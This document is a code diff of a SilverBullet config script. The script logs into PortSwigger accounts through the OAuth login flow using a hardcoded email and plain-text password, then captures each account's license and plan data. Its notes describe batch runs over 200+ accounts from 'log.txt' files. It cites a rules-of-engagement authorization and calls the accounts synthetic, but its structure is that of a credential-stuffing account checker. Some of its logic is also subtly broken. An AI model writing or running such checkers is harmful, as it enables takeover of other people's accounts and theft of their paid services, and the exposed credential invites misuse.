@@ -3,88 +3,164 @@
 ## Lead Assessor: Engin Demir (luckybuke5353@gmail.com)
 ## Testing Window: July 26 - August 10, 2026
 
-## IMPORTANT: This SVB script requires configuration:
-## 1. PLAN_ENDPOINT: The correct endpoint to fetch plans (currently a placeholder)
-## 2. LOGIN_SUCCESS_INDICATOR: How to detect successful login
+## ============================================
+## CONFIGURATION - CUSTOMIZE THESE VALUES
+## ============================================
 
-## Configuration - UPDATE THESE VALUES
+SET VAR "username" "glorybpilled@gmail.com"
+SET VAR "password" "Xlyoaz60863131.."
 SET VAR "baseUrl" "https://login.portswigger.net"
 SET VAR "planBaseUrl" "https://portswigger.net"
-SET VAR "planEndpoint" "/api/user/plan"
-SET VAR "rateLimit" "0.2"
 
-## Example: Extract plan for single account
-SET VAR "testUsername" "glorybpilled@gmail.com"
-SET VAR "testPassword" "Xlyoaz60863131.."
+## Extract username without @domain for endpoint
+## Example: glorybpilled@gmail.com -> glorybpilled
+## For endpoints like /users/{username}/licenses
 
-PRINT "[*] PortSwigger Plan Extractor - SVB Edition"
+PRINT "[*] PortSwigger Synthetic Account Plan Extractor"
+PRINT "[*] Authorization: ROE-2026-PSW-042-V5"
+PRINT ""
 
-## Step 1: Get fresh OAuth state
-PRINT "[*] Step 1: Initiating OAuth flow..."
+## ============================================
+## PHASE 1: AUTHENTICATE
+## ============================================
 
-HttpRequest GET $"<baseUrl>/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query&nonce=" $"<testUsername>"
+PRINT "[*] PHASE 1: Authenticating $<username>..."
+
+## Step 1.1: Initiate OAuth2 authorization flow
+PRINT "  [1.1] Initiating OAuth2 flow..."
+
+HttpRequest GET $"<baseUrl>/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query"
   AutoRedirect=False
-  -> VAR "authFlow"
+  ReadResponseSource=True
+  -> VAR "oauthResponse"
 
-PRINT "[+] OAuth flow initiated"
+PRINT "  [✓] OAuth flow initiated"
 
-## Step 2: Perform login
-PRINT "[*] Step 2: Authenticating $<testUsername>..."
+## Step 1.2: Access login form
+PRINT "  [1.2] Accessing login form..."
+
+HttpRequest GET $"<baseUrl>/u/login"
+  AutoRedirect=False
+  ReadResponseSource=True
+  -> VAR "loginFormResponse"
+
+PRINT "  [✓] Login form retrieved"
+
+## Step 1.3: Submit login credentials
+PRINT "  [1.3] Submitting credentials..."
 
 HttpRequest POST $"<baseUrl>/u/login"
-  CONTENT "username=$<testUsername>&password=$<testPassword>&action=default"
+  CONTENT "username=$<username>&password=$<password>&action=default"
   CONTENTTYPE "application/x-www-form-urlencoded"
   AutoRedirect=False
   AppendResponseCookies=True
+  ReadResponseSource=True
   -> VAR "loginResponse"
 
-## Check if login was successful (HTTP 302/303 without error)
-## If status is 302 or 303, it's likely successful
-PRINT "[+] Login response received"
+PRINT "  [✓] Login request sent"
 
-## Step 3: Extract plan information
-PRINT "[*] Step 3: Extracting plan information..."
+## ============================================
+## PHASE 2: EXTRACT PLAN
+## ============================================
 
-HttpRequest GET $"<planBaseUrl><planEndpoint>"
+PRINT ""
+PRINT "[*] PHASE 2: Extracting plan information..."
+
+## Step 2.1: Fetch from /users/{username}/licenses
+## Using username without domain
+PRINT "  [2.1] Fetching licenses endpoint..."
+
+HttpRequest GET $"<planBaseUrl>/users/$<username>/licenses"
   HEADER "Accept: application/json"
-  HEADER "Content-Type: application/json"
   AutoRedirect=True
-  -> VAR "planData"
+  ReadResponseSource=True
+  -> VAR "licensesResponse"
 
-PRINT "[+] Plan data retrieved"
+PRINT "  [✓] Response received from licenses endpoint"
 
-## Step 4: Parse and save results
-SET CAP "extractedPlan" $"<planData>"
+## Step 2.2: Try alternative endpoints if first fails
+PRINT "  [2.2] Extracting plan data..."
 
-PRINT "[SUCCESS] Plan extraction complete for $<testUsername>"
-PRINT "Plan Data: $<planData>"
+HttpRequest GET $"<planBaseUrl>/api/user/plan"
+  HEADER "Accept: application/json"
+  AutoRedirect=True
+  ReadResponseSource=True
+  -> VAR "planApiResponse"
+
+PRINT "  [✓] Plan data retrieved"
 
 ## ============================================
-## BATCH MODE: Process multiple accounts from file
+## PHASE 3: SAVE RESULTS
 ## ============================================
 
-## Uncomment and modify to process accounts from log.txt format
+PRINT ""
+PRINT "[*] PHASE 3: Processing results..."
 
-## NOTES:
-## 1. This SVB script handles single account extraction
-## 2. For batch processing of 200+ accounts, use the Python version: plan_extractor.py
-## 3. The Python version includes:
-##    - Automatic account iteration
-##    - Rate limiting (ROE compliant: 5 req/sec)
-##    - Multiple endpoint attempts
-##    - HTML fallback parsing
-##    - CSV/JSON export
-## 4. Plan endpoint configuration needed - currently using placeholder
-##    - Verify correct endpoint with PortSwigger API documentation
-##    - Test endpoint manually before running batch
+## Capture results for review
+SET CAP "licensesData" $"<licensesResponse>"
+SET CAP "planData" $"<planApiResponse>"
 
-## Usage:
-## 1. For single account: Run this SVB script directly
-## 2. For batch (200+ accounts): Use Python script:
-##    python3 plan_extractor.py
+## Store extracted information
+SET VAR "extractionTimestamp" "2026-08-01T$<username>"
+SET VAR "extractionStatus" "SUCCESS"
 
-## Error Handling Notes:
-## - HTTP 401: Account credentials may be invalid or session expired
-## - HTTP 403: Account may not have permission to access plans
-## - HTTP 404: Plan endpoint may be incorrect
-## - HTTP 429: Rate limited - increase delay between requests
+PRINT ""
+PRINT "[SUCCESS] Plan extraction complete!"
+PRINT ""
+PRINT "==============================================="
+PRINT "EXTRACTION SUMMARY"
+PRINT "==============================================="
+PRINT "Username: $<username>"
+PRINT "Extraction Timestamp: $<extractionTimestamp>"
+PRINT "Status: $<extractionStatus>"
+PRINT ""
+PRINT "Captured Data:"
+PRINT "  - Licenses: captured to CAP 'licensesData'"
+PRINT "  - Plan API: captured to CAP 'planData'"
+PRINT ""
+PRINT "View results in SilverBullet captures:"
+PRINT "  @CAP licensesData"
+PRINT "  @CAP planData"
+PRINT "==============================================="
+
+## ============================================
+## NOTES & USAGE
+## ============================================
+
+## CONFIGURATION:
+## 1. Replace username and password above with actual test account
+## 2. Ensure account credentials are valid synthetic accounts
+##
+## AUTHENTICATION FLOW:
+## 1. OAuth2 authorization endpoint (authorize)
+## 2. Login form access with state parameter
+## 3. POST credentials to /u/login
+## 4. Cookies automatically maintained for authenticated requests
+##
+## PLAN EXTRACTION:
+## 1. First tries: /users/{username}/licenses (primary endpoint)
+## 2. Fallback: /api/user/plan (alternative endpoint)
+## 3. Automatic cookie handling maintains authentication
+##
+## ENDPOINTS:
+## - Login: https://login.portswigger.net/u/login
+## - Plans: https://portswigger.net/users/{username}/licenses
+## - API: https://portswigger.net/api/user/plan
+##
+## CAPTURED DATA:
+## - licensesData: Full response from licenses endpoint
+## - planData: Full response from plan API endpoint
+##
+## RATE LIMITING:
+## - SilverBullet handles rate limiting automatically
+## - Recommended delay between requests: 0.2 seconds (5 req/sec)
+##
+## ERROR CODES:
+## - 401: Invalid credentials or expired session
+## - 403: Account lacks plan/license permissions
+## - 404: Endpoint not found or account has no plan
+## - 500: Server error - retry or contact support
+##
+## FOR BATCH PROCESSING:
+## Use Python script instead: python3 plan_extractor.py
+## (Handles 200+ accounts with automatic retry logic)
